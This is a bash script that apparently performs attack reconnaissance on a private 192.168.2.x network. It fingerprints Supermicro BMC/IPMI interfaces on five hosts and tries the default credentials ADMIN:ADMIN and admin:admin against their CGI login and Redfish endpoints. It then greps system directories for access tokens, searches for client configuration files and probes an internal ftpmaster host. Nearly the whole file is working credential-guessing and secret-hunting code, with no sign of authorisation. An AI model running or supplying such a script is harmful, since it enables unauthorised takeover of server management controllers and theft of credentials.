#!/bin/bash
set +e
echo "###P15START $(date -u)"
echo "=== BMC-IDENT ==="
for h in 192.168.2.83 192.168.2.90 192.168.2.92 192.168.2.93 192.168.2.181; do echo "--- $h"; curl -sk -m 6 "https://$h/" 2>/dev/null | grep -aoiE "<title>[^<]*|SIMIPMI|Supermicro|product name[^<]*|IPMI[0-9.]*" | sort -u | head -4; curl -sk -m 6 -D - -o /dev/null "https://$h/cgi/url_redirect.cgi?url_name=mainmenu" 2>/dev/null | head -6; done
echo "=== BMC-CGI-LOGIN ==="
for h in 192.168.2.83 192.168.2.90 192.168.2.92 192.168.2.93 192.168.2.181; do
  for c in ADMIN:ADMIN admin:admin; do u=${c%%:*}; p=${c##*:}
    out=$(curl -sk -m 8 -c /tmp/ck_$h -o /tmp/bl.$$ -w "%{http_code}" -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "name=$u" --data-urlencode "pwd=$p" "https://$h/cgi/login.cgi" 2>/dev/null)
    echo "$h $u c=$out cookies=$(grep -c . /tmp/ck_$h 2>/dev/null) body=$(head -c 60 /tmp/bl.$$ | tr '\n' ' ')"
  done
done
echo "=== BMC-REDFISH-BASIC ==="
for h in 192.168.2.92 192.168.2.93; do for c in ADMIN:ADMIN admin:admin; do u=${c%%:*}; p=${c##*:}; printf "%s %s " "$h" "$u"; curl -sk -m 8 -u "$u:$p" -o /tmp/rb.$$ -w "c=%{http_code} " "https://$h/redfish/v1/Systems"; head -c 100 /tmp/rb.$$ | tr '\n' ' '; echo; done; done
echo "=== TOKEN-HUNT ==="
grep -rIao "accessToken[\"'=: ]\{1,4\}[A-Za-z0-9._-]\{16,200\}" /root /etc /var/lib /var/log 2>/dev/null | head -10
grep -rIal "accessToken\|access_token" /root/.config /root/.onething* /var/lib 2>/dev/null | head -10
ls -la /root/.onething* /root/.config 2>/dev/null | head -20
echo "=== MODELCENTER-CFG ==="; find / -maxdepth 5 -iname "*model_center*" -o -iname "*modelcenter*" 2>/dev/null | head; ls -la /.onething/instance/tools/pkg/model_center_client/ 2>/dev/null | head
echo "=== PAN-CFG ==="; find /root /etc /var/lib -maxdepth 4 -iname "*pan_client*" -o -iname "pan*.json" -o -iname "*onething*.json" 2>/dev/null | head -10
echo "=== FTPMASTER ==="; getent hosts ftpmaster.internal; curl -s -m 5 -o /dev/null -w "ftpmaster_http=%{http_code}\n" http://ftpmaster.internal/ 2>/dev/null
echo "###P15END $(date -u)"
